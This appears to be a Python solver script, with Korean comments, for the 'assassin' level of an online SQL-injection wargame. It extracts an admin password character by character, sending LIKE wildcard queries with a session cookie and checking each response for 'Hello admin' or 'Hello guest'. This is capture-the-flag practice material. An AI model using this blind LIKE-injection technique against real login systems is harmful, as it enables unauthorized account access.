
# made by TOR
# pw.py version 2.6 - like용

import urllib.request
from urllib.parse import quote

password = [] # 패스워드를 저장할 리스트 

def find_pw(count):
        if count == 2:
                return 0

        for i in range(48,129,1):

                # 사용할 쿼리 제작 
                url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="
                test = "".join(password)
                query = str(test)+chr(i)+"%"
                query = quote(query)
                new_url = url + query
                
                # 쿠키 값 추가 해줌
                req = urllib.request.Request(new_url)
                req.add_header("Cookie", "<자신의 쿠키값>")
                response = urllib.request.urlopen(req)    

                # 문제가 id=admin을 만들기만 하면 되서 찾으면 끝
                if str(response.read()).find("Hello admin") != -1:
                        # ascii(95) = '_'로 무조건 만족하므로 제외시킴
                        if(i != 95): 
                                print("find admin")
                                password.append(chr(i))
                                count += 1
                                find_pw(count)
                                break 

                elif i == 128:
     
                        # admin과 guest의 pw글자가 같은 경우
                        for l in range(48,129,1):
                                url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw="
                                test = "".join(password)
                                query = str(test)+chr(l)+"%"
                                query = quote(query)
                                new_url = url + query
                                                
                                req = urllib.request.Request(new_url)
                                req.add_header("Cookie", "<자신의 쿠키값>")
                                response = urllib.request.urlopen(req)

                                if str(response.read()).find("Hello guest") != -1:
                                        if(l != 95):
                                                print("find password")
                                                password.append(chr(l))
                                                find_pw(count)
                                                break
                                else:
                                        print("{}".format(l))
                else:
                        print("{}".format(i))

find_pw(1)
print("Finish")
print("password:", password)
